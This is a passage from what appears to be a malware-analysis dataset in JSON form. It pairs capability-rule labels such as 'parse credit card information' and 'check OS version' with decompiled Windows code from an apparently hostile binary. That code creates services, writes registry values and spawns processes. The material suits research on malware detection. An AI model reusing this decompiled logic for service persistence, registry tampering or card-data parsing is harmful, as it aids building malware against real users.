        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00405003) overlaps instruction at (ram,0x00405002)\n// \n\nuint __cdecl fcn.00404f00(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    int32_t unaff_EDI;\n    bool bVar5;\n    bool in_SF;\n    float10 in_ST0;\n    ulong uVar6;\n    uint *noname_3;\n    uint arg_18h;\n    uint var_4h;\n    \n    if ((!in_SF) && (in_SF)) {\n        *(unaff_EDI + 0x1c) = in_ST0;\n    }\n    *0x422408 = fcn.00401170();\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileA)();\n    if (iVar2 != -1) {\n        noname_3 = &var_4h;\n        arg_18h = 0;\n        iVar4 = iVar2;\n        uVar6 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n        if (uVar6 != 0) {\n            if (*0x422408 != 0) {\n                iVar3 = *0x422408 + 0x7c8ecb0e;\n                *(iVar2 + 0x43d1773a) = *(iVar2 + 0x43d1773a) ^ 0xa127e95e;\n                puVar1 = (uVar6 >> 0x20) + iVar3 * 2;\n                *puVar1 = *puVar1 | iVar3 >> 8;\n                iVar4 = fcn.00404e40(iVar4, arg_ch, arg_10h, noname_3, arg_18h, arg_8h);\n                *0x422408 = iVar4 == 0;\n            }\n            fcn.00401ca0(0, iVar2);\n            bVar5 = (POPCOUNT(&stack0xffffffc0 & 0xff) & 1U) != 0;\n            if (((bVar5) && (!bVar5)) || (*0x422408 == 0)) {\n                *(extraout_ECX + 0x422408) = *(extraout_ECX + 0x422408) & 0xffffff85;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)();\n            }\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 573
    },
    "00401200": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.00401200(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.00404810(0x80000002, 0x4071d8, 0x407224, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 132
    },
    "00401e20": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nint64_t fcn.00401e20(void)\n\n{\n    uint32_t extraout_EDX;\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    lpVersionInformation = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    if (var_90h == 5) {\n        return CONCAT44(extraout_EDX, 1);\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return CONCAT44(extraout_EDX, 1);\n    }\n    return extraout_EDX << 0x20;\n}\n",
        "token_count": 152
    },
    "00401ec0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401ec0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, arg_10h, 0, 0, 0, 0, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 154
    },
    "00402ca0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402ee9) overlaps instruction at (ram,0x00402ee5)\n// \n// WARNING: Removing unreachable block (ram,0x00402e9a)\n\nvoid fcn.00402ca0(void)\n\n{\n    uint8_t **ppuVar1;\n    uint8_t uVar2;\n    uint8_t *puVar3;\n    uint8_t extraout_CH;\n    int32_t extraout_ECX;\n    uint unaff_EBX;\n    int32_t unaff_ESI;\n    uint8_t **unaff_EDI;\n    uint8_t **ppuVar4;\n    uint16_t in_ES;\n    uchar uVar5;\n    char cVar6;\n    char cVar7;\n    char cVar8;\n    float10 fVar9;\n    uint32_t uVar10;\n    \n    fcn.00401420(0x4223f0, 10, 0x40738c, 0x20);\n    fcn.00401420(0x4223f0, 10, 0x4073ac, 0x26);\n    fcn.00401420(0x4223f0, 10, 0x4073d4, 8);\n    fcn.00401420(0x4223f0, 10, 0x4073dc, 0x19);\n    fcn.00401420(0x4223f0, 10, 0x4073f8, 0xb);\n    fcn.00401420(0x4223f0, 10, 0x407404, 0x12);\n    fcn.00401420(0x4223f0, 10, 0x407418, 0x12);\n    fcn.00401420(0x4223f0, 10, 0x40742c, 2);\n    fcn.00401420(0x4223f0, 10, 0x407430, 8);\n    uVar2 = fcn.00401420(0x4223f0, 10, 0x407438, 8);\n    uVar5 = 0;\n    cVar8 = '\\0';\n    uVar2 = extraout_CH & uVar2 ^ 6;\n    cVar7 = uVar2 < '\\0';\n    cVar6 = uVar2 == 0;\n    puVar3 = fcn.00401420(0x4223f0, 10, 0x407440, 6);\n    ppuVar4 = unaff_EDI;\n    if ((cVar8 == cVar7) && (cVar8 != cVar7)) {\n        out(0xc4, puVar3);\n        ppuVar4 = unaff_EDI + 1;\n        *unaff_EDI = puVar3;\n        uVar2 = unaff_EBX >> 8;\n        uVar5 = uVar2 < *puVar3;\n        cVar7 = uVar2 - *puVar3 < '\\0';\n        cVar6 = uVar2 == *puVar3;\n    }\n    fVar9 = fcn.00401420(0x4223f0, 10, 0x407448, 7);\n    if ((!cVar7) && (cVar7)) {\n        ppuVar1 = ppuVar4 + 1;\n        puVar3 = unaff_ESI + 4;\n        *(ppuVar4 + 7) = fVar9;\n        ppuVar4 = ppuVar4 + 5;\n        unaff_ESI = unaff_ESI + 5;\n        uVar5 = *puVar3 < *ppuVar1;\n        cVar6 = *puVar3 == *ppuVar1;\n    }\n    while( true ) {\n        uVar10 = 0x402ed0;\n        fcn.00401420(0x4223f0, 10, 0x407450, 0x4223f0);\n        if ((uVar5) || (!uVar5)) break;\n        if (extraout_ECX == 1 || cVar6 == '\\0') {\n            *ppuVar4 = unaff_ESI + 4;\n            uVar10 = uVar10 & 0xffff0000 | in_ES;\ncode_r0x00402eeb:\n            fcn.00401420(0x4223f0, 10, 0x407458, uVar10);\n            fcn.00401420(0x4223f0, 10, 0x407460, 0x25);\n            fcn.00401420(0x4223f0, 10, 0x407488, 8);\n            return;\n        }\n    }\n    uVar10 = 6;\n    goto code_r0x00402eeb;\n}\n",
        "token_count": 1081
    },
    "00403200": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403252) overlaps instruction at (ram,0x0040324f)\n// \n\nbool __cdecl fcn.00403200(uint arg_8h)\n\n{\n    ushort extraout_var;\n    int32_t iVar1;\n    ushort extraout_CX;\n    ushort extraout_DX;\n    uint *puVar2;\n    uint32_t uVar3;\n    ushort in_SS;\n    ushort uVar5;\n    uint uVar4;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    (*_sym.imp.MSVCRT.dll__strlwr)(arg_8h);\n    var_14h = 0x407440;\n    var_10h = 0x407438;\n    var_ch = 0x407448;\n    var_8h = 0x407450;\n    var_4h = 0x407458;\n    uVar5 = extraout_var;\n    if (extraout_DX + (extraout_DX >> 8) != '\\0') {\n        uVar5 = extraout_CX;\n    }\n    uVar3 = CONCAT22(uVar5, in_SS);\n    uVar4 = 0x47;\n    puVar2 = &var_14h;\n    do {\n        iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h, *puVar2, uVar4);\n        if (iVar1 != 0) {\n            return true;\n        }\n        uVar3 = uVar3 + 1;\n        puVar2 = puVar2 + 1;\n    } while (uVar3 < 5);\n    iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h, 0x407430);\n    return iVar1 == 0;\n}\n",
        "token_count": 412
    },
    "00403900": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403a30) overlaps instruction at (ram,0x00403a2f)\n// \n// WARNING: Removing unreachable block (ram,0x00403a5b)\n// WARNING: Removing unreachable block (ram,0x00403a61)\n\nvoid fcn.00403900(void)\n\n{\n    uint uVar1;\n    char *pcVar2;\n    code *pcVar3;\n    uint8_t uVar4;\n    int32_t extraout_ECX;\n    int32_t iVar5;\n    int32_t extraout_ECX_00;\n    int32_t iVar6;\n    int32_t *piVar7;\n    code *unaff_EBX;\n    uint *unaff_ESI;\n    char **unaff_EDI;\n    uint *puVar8;\n    uint16_t in_ES;\n    uint8_t in_AF;\n    bool bVar9;\n    unkbyte10 extraout_ST0;\n    ulong uVar10;\n    unkbyte6 Var11;\n    uint32_t uVar12;\n    uchar uVar13;\n    uchar *puStack644;\n    uint var_25fh;\n    uchar s;\n    uint var_15bh;\n    uint var_58h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_14h;\n    uint hProcess;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack644 = &stack0xfffffd90;\n    fcn.00402ca0();\n    uVar10 = fcn.00403120();\n    piVar7 = uVar10 >> 0x20;\n    iVar6 = uVar10;\n    if (iVar6 == 0) {\n        return;\n    }\n    if ((iVar6 < 0) || (iVar5 = extraout_ECX,  iVar6 >= 0)) {\n        iVar5 = 0x40;\n        iVar6 = 0;\n        unaff_EDI = &var_25fh;\n    }\n    *(iVar6 + -0x7ce92414) = extraout_ST0;\n    uVar4 = iVar6 - 1U;\n    in_AF = 9 < (uVar4 & 0xf) | in_AF;\n    uVar4 = uVar4 + in_AF * '\\x06';\n    uVar4 = uVar4 + (0x90 < (uVar4 & 0xf0) | in_AF * (0xf9 < uVar4)) * '`';\n    pcVar2 = iVar6 - 1U & 0xffffff00 | uVar4;\n    *piVar7 = *piVar7 + 0x40b9df84;\n    *pcVar2 = *pcVar2 + uVar4;\n    *unaff_EBX = *unaff_EBX + (uVar10 >> 0x28);\n    for (; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *unaff_EDI = pcVar2;\n        unaff_EDI = unaff_EDI + 1;\n    }\n    *unaff_EDI = pcVar2;\n    puVar8 = unaff_EDI + 3;\n    *(unaff_EDI + 2) = uVar4;\n    puStack644 = NULL;\n    Var11 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)();\n    bVar9 = Var11 == 0;\n    if (bVar9) {\n        return;\n    }\n    if ((bVar9) || (uVar13 = puVar8 >> 0x18,  !bVar9)) {\n        fcn.00404470();\n        iVar6 = 0x40;\n    }\n    else {\n        uVar1 = in(Var11 >> 0x20);\n        *puVar8 = uVar1;\n        iVar6 = extraout_ECX_00;\n        puVar8 = unaff_EDI + 7;\n        if (&puStack644 < 1) goto code_r0x00403a2f;\n    }\n    *puVar8 = *unaff_ESI;\n    *(iVar6 + 0x40) = *(iVar6 + 0x40) + (unaff_EBX >> 8);\n    s = 0;\n    puVar8 = &var_15bh;\n    for (; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *(puVar8 + 2) = 0;\n    uVar13 = 0;\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    var_14h = 0;\n    unaff_EBX = _sym.imp.USER32.dll_EnumWindows;\n    unaff_ESI = _sym.imp.KERNEL32.dll_Sleep;\ncode_r0x00403a2f:\n    do {\n        puVar8 = &var_58h;\n        for (iVar6 = 0x11; iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar8 = 0;\n            puVar8 = puVar8 + 1;\n        }\n        uVar12 = 0;\n        iVar6 = (*_sym.imp.KERNEL32.dll_CreateProcessA)(0, &s, 0, 0, 0, 0, 0, 0, 0xa4, 0xec, uVar13);\n        if (iVar6 == 0) {\n            return;\n        }\n        if ((-1 < iVar6) && (-1 >= iVar6)) {\n            uVar12 = uVar12 & 0xffff0000 | in_ES;\n            unaff_ESI = unaff_ESI + -1;\n            *(puVar8 | &stack0xfffffffc) = iVar6;\n        }\n        (*unaff_ESI)(uVar12);\n        (*unaff_EBX)(fcn.004037f0, 0);\n        iVar6 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(0, 1000);\n        if (iVar6 == 0x102) {\n            (*_sym.imp.KERNEL32.dll_TerminateProcess)(0, 1);\n        }\n        pcVar3 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(0);\n        (*pcVar3)(0);\n        var_14h = var_14h + 1;\n    } while (var_14h < 1);\n    return;\n}\n",
        "token_count": 1436
    },
    "00403bf0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403bf0(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_264h = 0;\n    puVar5 = &var_263h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_160h = '\\0';\n    puVar5 = &var_15fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_160h, 0x40708c, arg_8h);\n    (*pcVar2)(&var_264h, 0x4070a4, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar4 = 0xffffffff;\n    pcVar6 = &var_160h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar6 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_34h = 0x4070cc;\n    var_30h = 0x4070d8;\n    var_2ch = 0x4070e4;\n    var_28h = 0x4070f4;\n    var_24h = 0x4070fc;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = arg_8h;\n    var_44h = ~uVar4 - 1;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if ((arg_ch != 0) < 5) {\n        uVar4 = (arg_ch != 0) * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_264h, *(&var_34h + uVar4), *(&var_5ch + uVar4), *(&var_20h + uVar4), \n                              *(&var_48h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1096
    },
    "004022e0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402454) overlaps instruction at (ram,0x00402451)\n// \n// WARNING: Removing unreachable block (ram,0x00402662)\n// WARNING: Removing unreachable block (ram,0x00402476)\n// WARNING: Removing unreachable block (ram,0x0040240c)\n// WARNING: Removing unreachable block (ram,0x004027c9)\n\nint32_t fcn.004022e0(void)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    uint8_t uVar3;\n    uchar uVar4;\n    ushort uVar5;\n    uint16_t uVar6;\n    int16_t iVar7;\n    int32_t iVar8;\n    char extraout_CL;\n    uint8_t extraout_CL_00;\n    uint8_t extraout_CH;\n    char extraout_CH_00;\n    uint32_t extraout_ECX;\n    uint8_t *extraout_ECX_00;\n    uint8_t extraout_CH_01;\n    uint32_t extraout_ECX_01;\n    uint8_t *puVar9;\n    uint8_t uVar10;\n    char extraout_CH_02;\n    char extraout_CH_03;\n    uint32_t extraout_ECX_02;\n    uint16_t extraout_DX;\n    int32_t extraout_EDX;\n    uint8_t **ppuVar11;\n    int32_t extraout_EDX_00;\n    uint32_t extraout_EDX_01;\n    uint8_t *unaff_EBX;\n    uint8_t *puVar12;\n    uint32_t unaff_EBP;\n    uint *unaff_ESI;\n    uint *puVar13;\n    uint *unaff_EDI;\n    uchar *puVar14;\n    char *pcVar15;\n    uint *puVar16;\n    uint *puVar17;\n    uint16_t in_ES;\n    uint8_t uVar18;\n    uchar uVar19;\n    bool bVar20;\n    char cVar21;\n    char cVar22;\n    bool bVar23;\n    ulong uVar24;\n    uint arg_14h;\n    uint in_stack_ffffffd8;\n    uint *arg_ch;\n    uint in_stack_ffffffdc;\n    uint32_t uVar25;\n    uint uVar26;\n    uint32_t uVar27;\n    uint8_t *puVar28;\n    \n    fcn.00401420(0x4223f0, 10, 0x407024, 10);\n    fcn.00401420(0x4223f0, 10, 0x407030, 0x12);\n    fcn.00401420(0x4223f0, 10, 0x407044, 4);\n    uVar18 = 0;\n    bVar20 = (extraout_CH | 0x47) < '\\0';\n    puVar14 = &stack0xffffffe4;\n    uVar24 = fcn.00401420(0x4223f0, 10, 0x407048, 0xc);\n    if ((bVar20) || (!bVar20)) {\n        puVar14 = 0x7;\n        in_stack_ffffffdc = 0x407054;\n        in_stack_ffffffd8 = 10;\n    }\n    else {\n        iVar8 = uVar24 + 0x68076a2f;\n        if (SCARRY4(uVar24, 0x68076a2f) != SCARRY4(iVar8, uVar18)) {\n            return iVar8 + uVar18;\n        }\n    }\n    pcVar15 = (uVar24 >> 0x20) + 10;\n    *pcVar15 = *pcVar15 + extraout_CH_00;\n    fcn.00401420(0x4223f0, in_stack_ffffffd8, in_stack_ffffffdc, puVar14);\n    fcn.00401420(0x4223f0, 10, 0x40705c, 0xb);\n    uVar27 = extraout_ECX & 0xffff0000 | CONCAT11((extraout_ECX >> 8) - unaff_EBX, extraout_ECX);\n    cVar22 = SBORROW4(uVar27, extraout_EDX);\n    cVar21 = uVar27 - extraout_EDX < 0;\n    uVar4 = fcn.00401420(0x4223f0, 10, 0x407068, 0xc);\n    if ((cVar22 == cVar21) && (cVar22 != cVar21)) {\n        unaff_ESI = unaff_ESI + -1;\n        puVar14 = unaff_EDI | unaff_EBP;\n        unaff_EDI = puVar14 + 1;\n        *puVar14 = uVar4;\n    }\n    fcn.00401420(0x4223f0, 10, 0x407074, 8);\n    uVar4 = 0;\n    cVar22 = '\\x01';\n    cVar21 = '\\x01';\n    uVar19 = 0;\n    uVar5 = fcn.00401420(0x4223f0, 10, 0x40707c, 0xd);\n    if ((cVar22 == cVar21) && (cVar22 != cVar21)) {\n        unaff_ESI = unaff_ESI + -1;\n        pcVar15 = unaff_EDI | unaff_EBP;\n        unaff_EDI = pcVar15 + 1;\n        *pcVar15 = uVar5;\n        uVar4 = 0;\n        cVar22 = '\\0';\n        uVar19 = uVar5 + (uVar5 >> 8) * 'y' == '\\0';\n    }\n    fcn.00401420(0x4223f0, 10, 0x40708c, 0x18);\n    if ((!uVar4 && !uVar19) && (uVar4 || uVar19)) {\n        if (cVar22) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    fcn.00401420(0x4223f0, 10, 0x4070a4, 0x25);\n    if ((!cVar22) && (cVar22)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    fcn.00401420(0x4223f0, 10, 0x4070cc, 10);\n    fcn.00401420(0x4223f0, 10, 0x4070d8, 0xc);\n    fcn.00401420(0x4223f0, 10, 0x4070e4, 0xd);\n    uVar6 = fcn.00401420(0x4223f0, 10, 0x4070f4, 6);\n    bVar20 = SBORROW2(((uVar6 & 0xff | (uVar6 >> 8) - 0x2b << 8) ^ 0x3d) + 0x7c28 ^\n                      (extraout_DX & 0xff | (extraout_DX >> 8 | extraout_DX) << 8), 0x4001);\n    fcn.00401420(0x4223f0, 10, 0x4070fc, 5);\n    if ((!bVar20) && (bVar20)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar7 = fcn.00401420(0x4223f0, 10, 0x407104, 0xd);\n    uVar18 = false;\n    bVar23 = SCARRY2(iVar7, 1);\n    bVar20 = iVar7 == -1;\n    puVar28 = 0x4223f0;\n    uVar25 = 0x4025f3;\n    puVar13 = unaff_EDI;\n    arg_ch = unaff_ESI;\n    uVar27 = unaff_EBP;\n    uVar24 = fcn.00401420(0x4223f0, 10, 0x407114, 0x19);\n    ppuVar11 = uVar24 >> 0x20;\n    if (bVar23) {\ncode_r0x00402617:\n        uVar26 = 0xf;\n        uVar27 = 0x407130;\n        arg_ch = 0xa;\n        puVar17 = unaff_EDI;\ncode_r0x0040261d:\n        pcVar15 = ppuVar11 + 10;\n        *pcVar15 = *pcVar15 + (extraout_ECX_00 >> 8);\n        bVar20 = *pcVar15 < '\\0';\n        arg_14h = 0x40262a;\n        iVar8 = fcn.00401420(0x4223f0, arg_ch, uVar27, uVar26);\n        if ((bVar20) || (!bVar20)) {\n            arg_14h = 0xe;\n        }\n        unaff_ESI = iVar8 + -0x1bf31dd6;\n        *unaff_EBX = *unaff_EBX & 0xc3;\n        uVar24 = fcn.00401420(0x4223f0, 10, 0x407140, arg_14h);\n        bVar20 = ((uVar24 >> 0x20 & 0xffffff00 | extraout_CH_01) & uVar24) < 0;\n        uVar18 = 0;\n        uVar25 = 0x40266f;\n        uVar24 = fcn.00401420(0x4223f0, 10, 0x407150, 0xb);\n        iVar8 = uVar24 >> 0x20;\n        uVar10 = extraout_ECX_01 >> 8;\n        if (bVar20) {\ncode_r0x00402684:\n            uVar25 = 0xb;\n            uVar27 = 0x40715c;\n            arg_ch = 0xa;\n            puVar13 = unaff_ESI;\n            puVar16 = puVar17;\ncode_r0x0040268a:\n            puVar28 = iVar8 + 10;\n            bVar20 = CARRY1(*puVar28, uVar10);\n            *puVar28 = *puVar28 + uVar10;\n            bVar23 = *puVar28 == 0;\n            puVar14 = &stack0xffffffd4;\n            fcn.00401420(0x4223f0, arg_ch, uVar27, uVar25);\n            if (bVar20 || bVar23) {\ncode_r0x004026b1:\n                *(extraout_EDX_00 + 10) = *(extraout_EDX_00 + 10) + extraout_CH_02;\n                fcn.00401420(0x4223f0, 10, 0x407168, 0xb);\n                goto code_r0x004026ca;\n            }\n            if (!bVar20 && !bVar23) goto code_r0x004026b1;\n            puVar17 = puVar16 + 1;\n            unaff_ESI = puVar13 + 1;\n            *puVar16 = *puVar13;\n            unaff_EBX = unaff_EBX & 0xffff0000 | CONCAT11(0xdf, unaff_EBX);\n            uVar25 = 0x6ae181d0;\ncode_r0x004026b2:\n            unaff_EBP = uVar25 | *(puVar14 + 0x68);\n        }\n        else {\n            puVar9 = extraout_ECX_01 & 0xffff;\n            uVar10 = puVar9 >> 8;\n            puVar12 = unaff_EBX;\n            if (!bVar20) goto code_r0x00402684;\ncode_r0x00402682:\n            iVar8 = uVar24 >> 0x20;\n            uVar10 = puVar9 >> 8;\n            unaff_EBX = puVar12;\n            puVar13 = unaff_ESI;\n            puVar16 = puVar17;\n            if (SCARRY4(uVar24, 0x680b6a2f) != SCARRY4(uVar24 + 0x680b6a2f, uVar18)) goto code_r0x0040268a;\ncode_r0x004026ca:\n            fcn.00401420(0x4223f0, 10, 0x407174, 10);\n            unaff_ESI = puVar13;\n            puVar17 = puVar16;\n        }\n        fcn.00401420(0x4223f0, 10, 0x407180, 0xc);\n        puVar13 = puVar17;\n        arg_ch = unaff_ESI;\n        uVar27 = unaff_EBP;\n        puVar28 = unaff_EBX;\n    }\n    else {\n        uVar25 = uVar25 & 0xffff | ppuVar11 << 0x10;\n        if (!bVar23) goto code_r0x00402617;\n        puVar17 = unaff_EDI + 1;\n        uVar4 = in(uVar24 >> 0x20);\n        *unaff_EDI = uVar4;\n        puVar9 = extraout_ECX_00;\n        puVar12 = CONCAT31(unaff_EBX >> 8, 0xbc);\n        if (!uVar18 && !bVar20) goto code_r0x00402682;\n        uVar26 = 0x56;\n        uVar18 = *extraout_ECX_00;\n        unaff_EBX = unaff_EBX & 0xffff0000 | CONCAT11(uVar18, 0xbc);\n        puVar14 = 0x30680f6a;\n        if (bVar23) goto code_r0x0040261d;\n        uVar25 = unaff_EBP | *0x30680fba;\n        puVar9 = *ppuVar11;\n        *ppuVar11 = extraout_ECX_00;\n        *0x30680f6a = *0x30680f6a + 'j';\n        uVar10 = *unaff_EBX;\n        *unaff_EBX = *unaff_EBX + uVar18;\n        uVar3 = *unaff_EBX;\n        *(uVar25 + 0xd0bddfb7) = *(uVar25 + 0xd0bddfb7) << 1 | CARRY1(uVar10, uVar18);\n        if (puVar9 == 0x1 || uVar3 != 0) goto code_r0x004026b2;\n    }\n    uVar25 = uVar27;\n    fcn.00401420(0x4223f0, 10, 0x40718c, 0xe);\n    bVar20 = false;\n    bVar23 = (extraout_CL - 5U & 0x44) == 0;\n    uVar26 = 0x40276e;\n    uVar24 = fcn.00401420(0x4223f0, 10, 0x40719c, 0x11);\n    if ((bVar20 || bVar23) || (!bVar20 && !bVar23)) {\n        uVar26 = 0x13;\n        uVar25 = 0x4071b0;\n        arg_ch = 0xa;\n        cVar21 = extraout_CH_03;\n    }\n    else {\n        cVar21 = extraout_CH_03 - *puVar28;\n        puVar1 = puVar13 + 0x6a;\n        puVar14 = *puVar1;\n        *puVar1 = *puVar1 - &stack0xffffffe4;\n        piVar2 = uVar24 + -0x50;\n        if (SCARRY4(uVar27, *piVar2) == SCARRY4(uVar27 + *piVar2, puVar14 < &stack0xffffffe4)) goto code_r0x00402809;\n    }\n    pcVar15 = (uVar24 >> 0x20) + 10;\n    *pcVar15 = *pcVar15 + cVar21;\n    fcn.00401420(0x4223f0, arg_ch, uVar25, uVar26);\n    puVar13 = puVar13 & 0xffff;\n    fcn.00401420(0x4223f0, 10, 0x4071c4, 0x14);\n    fcn.00401420(0x4223f0, 10, 0x4071d8, 0x33);\n    fcn.00401420(0x4223f0, 10, 0x40720c, 10);\ncode_r0x00402809:\n    fcn.00401420(0x4223f0, 10, 0x407218, 4);\n    uVar6 = (puVar13 | 0x2fff) - puVar28 ^ 0x7174;\n    cVar22 = '\\0';\n    cVar21 = uVar6 < 0;\n    bVar20 = uVar6 == 0;\n    uVar27 = 0x402869;\n    iVar8 = fcn.00401420(0x4223f0, 10, 0x40721c, 5);\n    if ((bVar20 || cVar22 != cVar21) || (!bVar20 && cVar22 == cVar21)) {\n        uVar27 = 6;\n    }\n    else {\n        puVar28 = puVar28 + 1;\n        *(iVar8 + 0x6a39da56) = *(iVar8 + 0x6a39da56) ^ extraout_CL_00;\n        uVar27 = uVar27 & 0xffff0000 | in_ES;\n    }\n    cVar21 = fcn.00401420(0x4223f0, 10, 0x407224, uVar27);\n    uVar6 = (extraout_ECX_02 ^ 0x6dd) + 1;\n    bVar20 = ((extraout_ECX_02 & 0xffff0000 | uVar6 & 0xff | (uVar6 >> 8) + cVar21 << 8) ^ extraout_EDX_01) < 0;\n    uVar26 = 0x4028c2;\n    fcn.00401420(0x4223f0, 10, 0x407258, 0x2a);\n    if ((bVar20) || (!bVar20)) {\n        uVar26 = 0xb;\n    }\n    *puVar28 = *puVar28 & 0xc3;\n    iVar8 = fcn.00401420(0x4223f0, 10, 0x407284, uVar26);\n    return iVar8;\n}\n",
        "token_count": 4281
    },
    "004017c0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
